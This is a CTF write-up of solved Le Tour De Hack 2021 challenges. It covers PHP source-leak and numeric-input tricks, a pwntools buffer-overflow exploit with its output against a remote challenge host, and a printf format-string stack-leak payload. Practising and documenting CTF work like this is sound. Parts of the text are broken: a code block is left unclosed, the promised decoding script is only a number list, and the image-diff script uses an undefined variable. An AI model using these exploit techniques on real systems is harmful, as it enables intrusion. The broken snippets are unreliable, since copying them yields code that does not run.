[Le Tour De Hack](https://ltdh21.enusec.org/) was an online CTF event organised by [ENUSEC](https://enusec.org/), the Edinburgh Napier Security Society.

This write-up will cover the challenges I solved during the event.

## Web

### Redacted

* Description: You can't see me therefore I must be hidden! 
* Solves: 32

This was a  simple challenge. We are given a webpage with the flag "redacted". Viewing the page source reveals the flag.

```html
<html>

<style>
h1{
text-align: center;
}


</style>

<h1>Classified</h1>

<a>

</a>
<svg width="500" height="500">
  <text x="0" y="15" fill="black">THE FLAG IS</text>
  <text x="100" y="15" fill="black">ltdh21{The_Truth_Is_Out_There}</text>
  <rect width="300" height="20" style="fill:rgb(0,0,0);stroke-width:3;stroke:rgb(0,0,0)" x="100" y="0" />
</svg>
</html>

```

### PHP Trickery

* Description: Daaaamn PHP, Back at it again with the crazy logic.
* Solves: 12

When the webpage loads it returns the message "Fail". The source code contains the comment `<!-- ?source -->`.
Adding the source parameter reveals the php source code.

```
https://trickery.enusec.org/index.php?source=
```

```php
<?php
include("flag.php");

if(isset($_GET["source"])){
        highlight_file(__FILE__);
}

function inverse($x) {
    return 1/$x;
}

if(isset($_GET["_"])){
    if(strlen($_GET["_"]) < 8){
        if(inverse($_GET["_"]) < -50000000) {
            die($flag);
        }
    }
}

echo("Fail");
?>
```

We can see that in order to reveal $flag we need to pass a number to the _ parameter, this number must be smaller than -50000000 after the inverse function. The number must also be less than 8 characters long. I first tried using hex however we need to pass a negative number and the strlen() function would include the 0x part of 0x0000 therefore hex wont work.

To provide a small enough negative number we can use scientific notation. The number `-1e-9` will pass the tests.

```
https://trickery.enusec.org/index.php?_=-1e-9

ltdh21{WhAts_B1gg3r_INF_or_Negative_INF}
```

### Exception not Found

* Description: Sometimes I get a call from my bank, and the first thing they ask is, 'Mr. Mitnick, may I get your account number?' And I'll say, 'You called me! I'm not giving you my account number!
* Solves: 11

Similar to php trickery adding the source= parameter reveals the php source:

```php
<?php
include("flag.php");
if(isset($_GET["source"])){
    highlight_file(__FILE__);
}

function inverse($x, $flag) {
    if($x == ""){
    throw new Exception("Not today Sucker");
    }
    if (!$x) {
        throw new Exception($flag);
    }
    return 1/$x;
}

try {
    if(isset($_GET["_"])){
        echo "Your answer is: " . inverse($_GET["_"], $flag) . "<br>";
    }
} catch (Exception $e) {
    echo 'Caught exception: ',  $e->getMessage(), "\n";
}
?>
```

This looks similar to PHP Trickery, again we need to supply a number to the _ parameter. This time we need to throw the exception that calls $flag. We can do this by setting _ = 0. 

```
https://exception.enusec.org/index.php?_=0

Caught exception: ltdh21{D0S_By_D1v1si0n}
```

## Pwn

### Pwn101

* Description: For the average home-user, anti-virus software is a must.
* Solves: 10


For the challenge we are provided main.c, a main binary and a nc session which runs the same binary remotely.

main.c:

```c
#include <string.h>
#include <stdio.h> 

void secret() {
  puts("ltdh21{N0t_T0dAy_SuCK3r5}\n");
}

void name() {
  puts("What is your name: ");
  char str[20]; 
    gets(str);
    printf("Hello %s\n", str); 
}  

int main( int argc, char** argv ) {
    printf("There is a secret at: %p\n", secret);
    name();
    return 0; 
}
```

This is a simple buffer overflow challenge. Running the binary we are promped to provide a name, which is the printed to screen. The binary also provides the memory address of the secret() function.

```bash
$ ./main 
There is a secret at: 0x5660020d
What is your name: 
JDMCE
Hello JDMCE

```

This address changes each time the binary is run so we will have to extract that in our exploit script.

We can cause a segmentation fault by overflowing the input buffer which the source tells us is str[20]. Using gdb/gef I determined the offset required to overwrite $eip which is 32, we can now write an exploit script

```python
#!/usr/bin/env python3

from pwn import *
import re

#p = process('./main')

p = remote("206.189.123.169", 5001)

output = p.recvline()
log.info(output)

win_addr = re.findall("0[xX][0-9a-fA-F]+", str(output))
win_addr = int(win_addr[0], base=16)
log.info(f"Win address = {win_addr}")

offset = 32
junk = b'A' * offset

payload = [junk, p32(win_addr)]
payload = b"".join(payload)

p.sendline(payload)

p.interactive()

```

```bash
$ python3 exp.py
[+] Opening connection to 206.189.123.169 on port 5001: Done
[*] There is a secret at: 0x5662620d
[*] Win address = 1449288205
[*] Switching to interactive mode
What is your name: 
bbV
ltdh21{Y0u_JuST_Pwn3d_Th1s_BaD_Bo1s}

```

### Leak Monster

* Description: Can someone call a plumber?
* Solves: 10

For this challenge we are provided main.c and a nc session.

main.c:

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    char text[1024];
    char flag[] = "AAAA";
    printf("Whats your Name Mr plumber: ");
    fgets(text, 1024 , stdin);
    printf("Hello  there ");
    printf(text);
    printf("\n");
    return(0);
}

```

The source code is a textbook example of how not to use the printf() function. We can exploit this using %x string formatting.

The following input leaks the stack.

```bash
$ nc 206.189.123.169 5000       
Whats your Name Mr plumber: AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
Hello  there AAAA00000400.f7ee1580.5662424b.f7cff4d4.f7ee97c0.f7ee9110.ffd61754.00000009.00000001.f7d0268c.64746cd8.7b313268.336d3053.5f336e6f.4c6c4163.505f415f.424d756c.007d7233.41414141.78383025.

```

The leading AAAA acts as a marker, we find the resulting 41414141 in the stack and look at the preceding bytes. Using cyberchef I swap the endianness and convert from hex to get the flag.

## Misc

### oooo some Latine

* Description: George indiget aliquo auxilio, non potest se adiuvare vos?
* Solves: 23

We are given a nc session to join

```bash
$ nc 167.99.86.217 9000
                                       ._ o o

                           ,"     ## /
                         ,"   ##    /

enter "exit" to quit
George: 
```

The ascii reads:

```
What is the Latin for flag?
```

The latin for flag is vexillum. Typing vexillum into the prompt return the ascii values, typing in the asci values returns the flag

```
George: vexillum
vexillum

### Don't Ascii Me Again

* Description: Stop Ascii me questions!
* Solves: 16

Again we are given a nc session to connect to. We are given a long list of numbers and told to decode the message to get the flag. 

I noticed that typing in a character at the prompt returns 5 numbers, repeating the character changes the numbers, however the numbers always add up to the ascii value of the character

```
: a

57 6 9 22 3 
: a

8 31 9 33 16 
: 

57+6+9+22+3=97=a
```

To decode the message we need to group the numbers into chunks of 5, sum them then convert to text. I wrote the following python script:

```py
#!/usr/bin/env python3

nums = [10, 10, 11, 33, 8, 69, 9, 17, 3, 3, 38, 13, 5, 34, 18, 12, 31, 18, 16, 31, 24, 10, 10, 57, 10, 5, 4, 2, 1, 20, 3, 34, 20, 32, 8, 2, 12, 57, 37, 2, 24, 1, 4, 62, 9, 3, 9, 5, 3, 12, 8, 37, 19, 5, 50, 4, 18, 13, 26, 40, 6, 33, 30, 2, 37, 18, 30, 11, 1, 39, 8, 4, 27, 46, 26, 11, 12, 11, 1, 74, 37, 25, 2, 29, 8, 11, 12, 1, 17, 3, 2, 8, 15, 1, 6, 25, 36, 1, 9, 2, 11, 6, 12, 2, 1, 35, 69, 11, 3, 1, 60, 10, 27, 4, 10, 9, 12, 37, 23, 36, 3, 50, 33, 4, 18, 12, 5, 9, 62, 12, 11, 7, 2, 8, 4, 47, 10, 21, 8, 22, 66, 6, 5, 4, 24, 2, 14, 17, 45, 29, 21, 31, 3, 21, 25, 10, 8, 3, 7, 4, 35, 13, 9, 27, 32, 16, 4, 66, 23, 2, 3, 2, 3, 7, 17, 7, 17, 23, 43, 15, 11, 34, 26, 1, 38, 13, 25, 2, 13, 49, 55, 22, 12, 19, 3, 37, 13, 12, 6, 46, 18, 24, 29, 19, 19, 2, 7, 2, 12, 9, 53, 16, 19, 4, 29, 14, 35, 3, 11, 48, 12, 23, 61, 9, 12, 3, 6, 14, 8, 1, 6, 55, 17, 14, 24, 23, 10, 6, 58, 7, 3, 41, 2, 48, 3, 5, 23, 31, 37, 20, 6, 7, 12, 5, 2, 30, 3, 8, 3, 56, 14, 34, 2, 1, 60, 12, 4, 10, 10, 69, 15, 10, 25, 30, 30, 39, 1, 54, 6, 3, 1, 18, 5, 6, 2, 6, 8, 29, 42, 31, 4, 49, 47, 2, 2, 24, 11, 39, 7, 24, 39, 1, 34, 5, 36, 7, 2, 15, 2, 6, 10, 43, 12, 27, 6, 5, 18, 4, 78, 16, 5, 10, 6, 6, 5, 8, 46, 13, 33, 4, 31, 46, 7, 6, 7, 7, 52, 12, 23, 16, 9, 39, 22, 6, 24, 10, 2, 3, 9, 8, 49, 8, 16, 7, 39, 19, 8, 13, 36, 35, 6, 16, 47, 9, 39, 18, 21, 5, 47, 17, 8, 36, 13, 21, 22, 6, 4, 1, 18, 3, 24, 29, 9, 19, 17, 7, 25, 40, 13, 16, 4, 12, 1, 9, 6, 21, 9, 8, 13, 46, 15, 1, 11, 4, 1, 5, 1, 32, 9, 61, 43, 12, 4, 15, 37, 2, 14, 57, 34, 3, 17, 27, 1, 14, 44, 3, 4, 6, 3, 16, 7, 12, 19, 2, 57, 15, 2, 36, 37, 20, 65, 9, 14, 10, 2, 3, 9, 1, 12, 7, 13, 11, 53, 24, 15, 23, 32, 3, 36, 7, 3, 24, 24, 5, 44, 3, 5, 42, 51, 4, 41, 4, 23, 31, 12, 38, 23, 15, 23, 18, 22, 24, 38, 26, 5, 8, 1, 10, 9, 4, 89, 14, 2, 4, 3, 5, 6, 43, 38, 22, 12, 16, 15, 10, 58, 26, 7, 33, 20, 13, 31, 5, 25, 23, 15, 28, 2, 28, 14, 29, 4, 1, 25, 8, 77, 36, 8, 19, 36, 16, 16, 1, 1, 20, 6, 3, 12, 11, 1, 5, 20, 75, 9, 2, 2, 9, 15, 21, 19, 52, 19, 14, 58, 3, 6, 12, 17, 34, 18, 23, 10, 12, 12, 13, 3, 6, 13, 1, 18, 11, 15, 15, 41, 20, 32, 5, 12, 3, 19, 16, 30, 1, 15, 30, 28, 3, 19, 14, 5, 11, 10, 20, 9, 12, 4, 2, 9, 29, 10, 3, 3, 13, 21, 55, 3, 6, 22, 67, 12, 5, 30, 44, 1, 3, 36, 7, 10, 17, 8, 9, 15, 5, 15, 1, 19, 5, 8, 5, 12, 25, 10, 35, 7, 56, 13, 9, 18, 15, 6, 47, 33, 16, 30, 5, 35, 56, 6, 10, 28, 4, 22, 12, 4, 13, 1, 6, 13, 8, 33, 39, 32, 6, 7, 5, 57, 1, 31, 12, 3, 48, 33, 11, 37, 36, 4, 24, 6, 7, 4, 7, 4, 7, 7, 1, 29, 2, 2, 4, 10, 30, 5, 27, 51, 20, 22]

### Spot the Difference

* Description: Can you find all the differences? Please circle each difference you find. If you can find all 10 differences you earn a gold star!
* Solves: 15

![Spot the Difference]({{ site.url }}{{ site.baseurl }}/assets/ltdh21/SpotTheDiffimg1.png)

We are given two images. The name of the challenge suggests we diff the two images.

I wrote the following python script to diff the two images and save the result as a new image:

```py
#!/usr/bin/env python3

from PIL import Image
from PIL import ImageChops

image1 = Image.open("image1.png")
image2 = Image.open("image2.png")


difference = ImageChops.difference(image2, imagedif)
difference.save("dif.png")
```

The resulting image looks like this:

![Difference]({{ site.url }}{{ site.baseurl }}/assets/ltdh21/dif.png)

I opened the image in StegSolve and found the flag

![flag]({{ site.url }}{{ site.baseurl }}/assets/ltdh21/spottheflag.jpg)
